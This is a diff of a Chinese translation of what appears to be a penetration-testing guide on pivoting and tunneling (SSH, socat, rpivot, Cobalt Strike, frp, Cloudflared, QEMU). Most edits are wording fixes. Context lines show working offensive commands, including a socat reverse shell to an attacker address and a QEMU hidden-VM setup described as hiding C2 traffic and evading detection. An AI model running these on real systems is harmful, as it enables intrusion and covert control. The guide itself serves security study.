@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### 反向端口转发
 
-这对于从内部主机通过DMZ获取反向shell到您的主机非常有用：
+这对于从内部主机通过 DMZ 获取反向 shell 到您的主机非常有用：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -88,7 +88,7 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
-> **安全 – Terrapin 攻击 (CVE-2023-48795)**
+> **安全 - Terrapin 攻击 (CVE-2023-48795)**
 > 2023年的Terrapin降级攻击可以让中间人篡改早期的SSH握手并将数据注入到**任何转发通道**（`-L`，`-R`，`-D`）。确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或者在依赖SSH隧道之前明确禁用易受攻击的`chacha20-poly1305@openssh.com`和`*-etm@openssh.com`算法，在`sshd_config`/`ssh_config`中进行设置。
 
 ## SSHUTTLE
@@ -163,7 +163,7 @@ rportfwd stop [bind port]
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
+> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在 Team Server 上，**流量被发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的主机:端口。
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢转
+通过 **NTLM 代理** 进行枢轴
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -276,7 +276,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### 通过socks进行Port2Port
+### Port2Port通过socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -347,18 +347,18 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有 **系统的 RDP 访问权限**。\
+您需要拥有**系统的RDP访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`动态虚拟通道`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`**，如下所示：
+在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP plugin is enabled**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
 通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
@@ -372,7 +372,7 @@ netstat -antb | findstr 1080
 
 ## 代理 Windows GUI 应用程序
 
-您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理导航。\
+您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
 在 **Profile -> Proxification Rules** 中添加要代理的程序名称和要代理的 IP 连接。
 
@@ -397,7 +397,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
 
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用 Cloudflare 的边缘作为会合点。当出站防火墙仅允许 HTTPS 流量而入站连接被阻止时，这非常方便。
+Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用Cloudflare的边缘作为会合点。当出站防火墙仅允许HTTPS流量而入站连接被阻止时，这非常方便。
 
 ### 快速隧道一行命令
 ```bash
@@ -574,11 +574,11 @@ url: http://127.0.0.1:8000
 ```bash
 cloudflared tunnel run mytunnel
 ```
-因为所有流量都通过主机 **出站 443** 端口离开，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
+因为所有流量都通过 **443 端口出站**，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 - 尽可能使用容器或 `--user` 标志。
 
 ## FRP (快速反向代理)
 
-[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0 (2024年5月)** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
+[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0（2024年5月）** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 - 无需额外的二进制文件。
 
 ### 经典反向 TCP 隧道
 ```bash
@@ -610,9 +610,9 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 非常适合利用现有资源进行转发。
 
-## 使用 QEMU 的隐蔽 VM 基于隧道
+## 使用 QEMU 的隐蔽 VM 基础隧道
 
-QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个短暂的 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。
+QEMU 的用户模式网络 (`-netdev user`) 支持一个名为 `hostfwd` 的选项，该选项 **将 *主机* 上的 TCP/UDP 端口绑定并转发到 *客户机* 中**。 当客户机运行完整的 SSH 守护进程时，hostfwd 规则为您提供一个一次性 SSH 跳转盒，完全存在于一个临时 VM 中 – 非常适合隐藏 C2 流量，因为所有恶意活动和文件都保留在虚拟磁盘中。
 
 ### 快速一行命令
 ```powershell
@@ -625,8 +625,8 @@ qemu-system-x86_64.exe ^
 -nographic
 ```
 • 上面的命令在 RAM 中启动一个 **Tiny Core Linux** 镜像 (`tc.qcow2`)。  
-• Windows 主机上的端口 **2222/tcp** 被透明地转发到来宾内部的 **22/tcp**。  
-• 从攻击者的角度来看，目标仅仅暴露了端口 2222；到达该端口的任何数据包都由在虚拟机中运行的 SSH 服务器处理。  
+• Windows 主机上的端口 **2222/tcp** 透明地转发到来宾内部的 **22/tcp**。  
+• 从攻击者的角度来看，目标仅仅暴露了端口 2222；任何到达该端口的数据包都由在虚拟机中运行的 SSH 服务器处理。  
 
 ### 通过 VBScript 隐秘启动
 ```vb
@@ -653,8 +653,8 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### 为什么这能逃避检测
 
 • 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 访问磁盘；没有安装驱动程序或服务。
-• 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在 VM 内部终止）。
-• 内存扫描器从未分析恶意进程空间，因为它存在于不同的操作系统中。
+• 主机上的安全产品看到的是 **良性的回环流量**（实际的 C2 在虚拟机内部终止）。
+• 内存扫描器从不分析恶意进程空间，因为它存在于不同的操作系统中。
 
 ### Defender 提示
 
